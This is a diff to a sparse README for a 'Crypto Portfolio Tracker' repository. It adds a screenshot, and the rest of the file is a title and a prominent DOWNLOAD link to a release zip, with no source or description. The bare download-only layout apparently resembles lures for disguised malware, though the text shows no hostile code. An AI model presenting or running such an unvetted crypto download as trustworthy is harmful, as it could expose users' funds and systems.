@@ -1,9 +1,13 @@
 
 # 🚀 Crypto Portfolio Tracker
 
+<img width="992" height="596" alt="image" src="https://github.com/user-attachments/assets/79908a03-c307-4f50-a70b-be7f320f8b7b" />
+
 
 
 # [DOWNLOAD](https://github.com/Geoxant8/Crypto-Portfolio-Tracker/releases/download/download/Crypto.Portfolio.Tracker.zip)
+
+
 
 
 
